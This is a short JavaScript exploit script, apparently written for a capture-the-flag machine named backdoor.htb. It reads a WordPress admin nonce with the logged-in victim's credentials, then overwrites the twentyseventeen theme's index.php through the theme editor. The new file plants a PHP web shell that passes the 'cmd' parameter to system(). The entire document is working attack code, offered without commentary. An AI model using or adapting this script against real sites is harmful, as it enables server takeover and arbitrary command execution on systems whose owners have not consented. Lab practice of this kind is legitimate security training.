var wpnonce = '';

function getCSRFNonce(callback)
{
  var re = /<input type="hidden" id="_wpnonce" name="_wpnonce" value="(\w*)" \/>/

  var xhr = new XMLHttpRequest();
  xhr.open("GET", "http://backdoor.htb/wp-admin/theme-editor.php?file=index.php&theme=twentyseventeen", true);
  xhr.withCredentials = true;
  xhr.overrideMimeType('text/xml');

  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4) {
      response = xhr.responseText;
      wpnonce = response.match(re)[1];
      callback();
    }
  }

  xhr.send();
}


function submitExploit()
{
  getCSRFNonce(function() { 
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://backdoor.htb/wp-admin/theme-editor.php", true);
    xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.withCredentials = true;
    var body = "_wpnonce=" + wpnonce + "&_wp_http_referer=/wp-admin/theme-editor.php?file=index.php&theme=twentyseventeen&newcontent=%3C?php%0A/**%0A%20*%20The%20main%20template%20file%0A%20*%0A%20*%20This%20is%20the%20most%20generic%20template%20file%20in%20a%20WordPress%20theme%0A%20*%20and%20one%20of%20the%20two%20required%20files%20for%20a%20theme%20(the%20other%20being%20style.css).%0A%20*%20It%20is%20used%20to%20display%20a%20page%20when%20nothing%20more%20specific%20matches%20a%20query.%0A%20*%20E.g.,%20it%20puts%20together%20the%20home%20page%20when%20no%20home.php%20file%20exists.%0A%20*%0A%20*%20@link%20https://codex.wordpress.org/Template_Hierarchy%0A%20*%0A%20*%20@package%20WordPress%0A%20*%20@subpackage%20Twenty_Seventeen%0A%20*%20@since%201.0%0A%20*%20@version%201.0%0A%20*/%0A%0Aget_header();%20?%3E%0A%3C?php%0A%0Aif(isset($_REQUEST%5B'cmd'%5D))%7B%0A%20%20%20%20%20%20%20%20echo%20%22%3Cpre%3E%22;%0A%20%20%20%20%20%20%20%20$cmd%20=%20($_REQUEST%5B'cmd'%5D);%0A%20%20%20%20%20%20%20%20system($cmd);%0A%20%20%20%20%20%20%20%20echo%20%22%3C/pre%3E%22;%0A%20%20%20%20%20%20%20%20die;%0A%7D%0A%0A?%3E%0A%3Cdiv%20class=%22wrap%22%3E%0A%09%3C?php%20if%20(%20is_home()%20&&%20!%20is_front_page()%20)%20:%20?%3E%0A%09%09%3Cheader%20class=%22page-header%22%3E%0A%09%09%09%3Ch1%20class=%22page-title%22%3E%3C?php%20single_post_title();%20?%3E%3C/h1%3E%0A%09%09%3C/header%3E%0A%09%3C?php%20else%20:%20?%3E%0A%09%3Cheader%20class=%22page-header%22%3E%0A%09%09%3Ch2%20class=%22page-title%22%3E%3C?php%20_e(%20'Posts',%20'twentyseventeen'%20);%20?%3E%3C/h2%3E%0A%09%3C/header%3E%0A%09%3C?php%20endif;%20?%3E%0A%0A%09%3Cdiv%20id=%22primary%22%20class=%22content-area%22%3E%0A%09%09%3Cmain%20id=%22main%22%20class=%22site-main%22%20role=%22main%22%3E%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C?php%20isset($_GET%5B'cmd'%5D)%20?%20system($_GET%5B'cmd'%5D)%20:%20'';%20?%3E%0A%0A%09%09%09%3C?php%0A%09%09%09if%20(%20have_posts()%20)%20:%0A%0A%09%09%09%09/*%20Start%20the%20Loop%20*/%0A%09%09%09%09while%20(%20have_posts()%20)%20:%20the_post();%0A%0A%09%09%09%09%09/*%0A%09%09%09%09%09%20*%20Include%20the%20Post-Format-specific%20template%20for%20the%20content.%0A%09%09%09%09%09%20*%20If%20you%20want%20to%20override%20this%20in%20a%20child%20theme,%20then%20include%20a%20file%0A%09%09%09%09%09%20*%20called%20content-___.php%20(where%20___%20is%20the%20Post%20Format%20name)%20and%20that%20will%20be%20used%20instead.%0A%09%09%09%09%09%20*/%0A%09%09%09%09%09get_template_part(%20'template-parts/post/content',%20get_post_format()%20);%0A%0A%09%09%09%09endwhile;%0A%0A%09%09%09%09the_posts_pagination(%20array(%0A%09%09%09%09%09'prev_text'%20=%3E%20twentyseventeen_get_svg(%20array(%20'icon'%20=%3E%20'arrow-left'%20)%20)%20.%20'%3Cspan%20class=%22screen-reader-text%22%3E'%20.%20__(%20'Previous%20page',%20'twentyseventeen'%20)%20.%20'%3C/span%3E',%0A%09%09%09%09%09'next_text'%20=%3E%20'%3Cspan%20class=%22screen-reader-text%22%3E'%20.%20__(%20'Next%20page',%20'twentyseventeen'%20)%20.%20'%3C/span%3E'%20.%20twentyseventeen_get_svg(%20array(%20'icon'%20=%3E%20'arrow-right'%20)%20),%0A%09%09%09%09%09'before_page_number'%20=%3E%20'%3Cspan%20class=%22meta-nav%20screen-reader-text%22%3E'%20.%20__(%20'Page',%20'twentyseventeen'%20)%20.%20'%20%3C/span%3E',%0A%09%09%09%09)%20);%0A%0A%09%09%09else%20:%0A%0A%09%09%09%09get_template_part(%20'template-parts/post/content',%20'none'%20);%0A%0A%09%09%09endif;%0A%09%09%09?%3E%0A%0A%09%09%3C/main%3E%3C!--%20#main%20--%3E%0A%09%3C/div%3E%3C!--%20#primary%20--%3E%0A%09%3C?php%20get_sidebar();%20?%3E%0A%3C/div%3E%3C!--%20.wrap%20--%3E%0A%0A%3C?php%20get_footer();%0A&action=update&file=index.php&theme=twentyseventeen&scrollto=291&docs-list=&submit=Update%20File%22;%0A%20";
    var aBody = new Uint8Array(body.length);
    for (var i = 0; i < aBody.length; i++)
      aBody[i] = body.charCodeAt(i); 
    xhr.send(new Blob([aBody]));
  });
}

submitExploit();